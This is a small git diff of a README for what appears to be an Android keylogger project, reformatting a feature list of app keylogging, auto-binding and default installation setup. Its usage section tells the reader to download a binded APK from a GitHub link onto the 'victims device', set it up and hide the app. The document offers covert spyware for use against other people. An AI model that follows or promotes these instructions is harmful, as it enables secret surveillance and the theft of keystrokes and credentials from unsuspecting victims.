@@ -22,9 +22,9 @@
 </p>
 
 ## Features:
--App keylogger
--Auto bind
--Default installation setup
+- App keylogger
+- Auto bind
+- Default installation setup
 
 ## Usage 
 > Download this in victims device `https://github.com/Alygnt/Mailogger/raw/main/KL_binded.apk` and setup the process and hide the app
